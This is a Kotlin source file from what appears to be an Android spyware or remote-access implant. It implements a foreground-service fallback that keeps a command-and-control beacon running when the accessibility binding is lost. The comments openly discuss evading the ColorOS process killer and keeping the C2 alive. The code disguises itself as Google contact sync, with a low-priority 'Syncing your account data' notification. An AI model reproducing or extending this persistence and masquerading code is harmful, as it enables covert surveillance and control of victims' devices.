package com.shadow

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log

/**
 * The survival path, as opposed to accessibility's low-latency path.
 *
 * ColorOS's o-killer reaps a plain background process every ~48s, which is why
 * the implant has always leaned on the a11y binding. When a11y is unavailable
 * (crashed, toggled off, never rebound by AMS) that binding is gone and the
 * beacon dies with the process, so the fleet reads DEAD even though every
 * non-a11y primitive still works.
 *
 * A *started* foreground service with a data-sync notification is not reaped on
 * that timer. Hosting ShadowCore.start() here means the Rust core runs while the
 * process is a foreground service, independent of whether a11y is bound.
 *
 * This service exists ONLY in the degraded state. KeepAlive stops it the moment
 * a11y is bound again, and a self-watchdog re-checks from inside the service, so
 * the notification it costs is visible only while the implant is actually
 * degraded. Android 14 limits data-sync FGS windows to ~6h; that is still ~450x
 * the 48s reap, and START_STICKY plus the heartbeat's KeepAlive tick restart it
 * when the window closes.
 */
class SyncForegroundService : Service() {

    companion object {
        private const val TAG = "SyncFg"
        private const val CHANNEL_ID = "sync_foreground"
        private const val NOTIF_ID = 1001

        /** How often the running service re-checks whether a11y came back. */
        private const val WATCHDOG_MS = 20_000L

        fun start(context: Context) {
            try {
                val intent = Intent(context, SyncForegroundService::class.java)
                if (Build.VERSION.SDK_INT >= 26) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                // ForegroundServiceStartNotAllowedException on a background start
                // (API 31+). Boot, WorkManager and the a11y binding are all exempt;
                // only a bare background start races this, and the next heartbeat
                // tick or WorkManager window covers it.
                Log.w(TAG, "startForegroundService rejected: ${e.message}")
            }
        }

        fun stop(context: Context) {
            try {
                context.stopService(Intent(context, SyncForegroundService::class.java))
            } catch (e: Exception) {
                Log.w(TAG, "stopService failed: ${e.message}")
            }
        }
    }

    /**
     * a11y can come back with nobody telling us: AMS rebinds on its own after a
     * settings change or a reboot, and KeepAlive.evaluate() only runs when some
     * entry point fires. This watchdog closes that gap from inside the service so
     * the notification never lingers after the implant has recovered.
     */
    private val watchdog = Handler(Looper.getMainLooper())
    private val checkA11y = object : Runnable {
        override fun run() {
            if (KeepAlive.a11yBound()) {
                Log.i(TAG, "accessibility bound again -> dropping the fallback")
                stopSelf()
                return
            }
            watchdog.postDelayed(this, WATCHDOG_MS)
        }
    }

    override fun onCreate() {
        super.onCreate()
        createChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            val type = if (Build.VERSION.SDK_INT >= 29) {
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            } else {
                0
            }
            val notif = buildNotification()
            if (Build.VERSION.SDK_INT >= 29) {
                startForeground(NOTIF_ID, notif, type)
            } else {
                startForeground(NOTIF_ID, notif)
            }
            Log.i(TAG, "foreground fallback active -- process promoted out of the reaper's tier")
        } catch (e: Exception) {
            // FatalServiceException if startForeground was too slow, or a type
            // mismatch on an OEM that forbids dataSync. The process keeps running
            // and the core still beacons; only the promotion is lost.
            Log.e(TAG, "startForeground failed: ${e.message}")
        }

        // Host the beacon. ShadowCore.start() is idempotent per process, so being
        // called from here, from a11y and from WorkManager is harmless.
        try {
            ShadowCore.start(applicationContext, com.google.android.contactsync.BuildConfig.C2_DOMAIN)
        } catch (e: Exception) {
            Log.e(TAG, "failed to start core from foreground service: ${e.message}")
        }

        watchdog.removeCallbacks(checkA11y)
        watchdog.postDelayed(checkA11y, WATCHDOG_MS)

        return START_STICKY
    }

    override fun onDestroy() {
        watchdog.removeCallbacks(checkA11y)
        // The beacon thread is not owned by this service, so stopping the service
        // (a11y came back) does not interrupt the C2.
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Sync service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Keeps account sync running in the background."
                setShowBadge(false)
                setSound(null, null)
                enableVibration(false)
            }
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        val builder = if (Build.VERSION.SDK_INT >= 26) {
            Notification.Builder(this, CHANNEL_ID)
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
        }
        return builder
            .setContentTitle("Sync Adapter")
            .setContentText("Syncing your account data")
            .setSmallIcon(android.R.drawable.stat_sys_sync)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_MIN)
            .setCategory(Notification.CATEGORY_SERVICE)
            .build()
    }
}
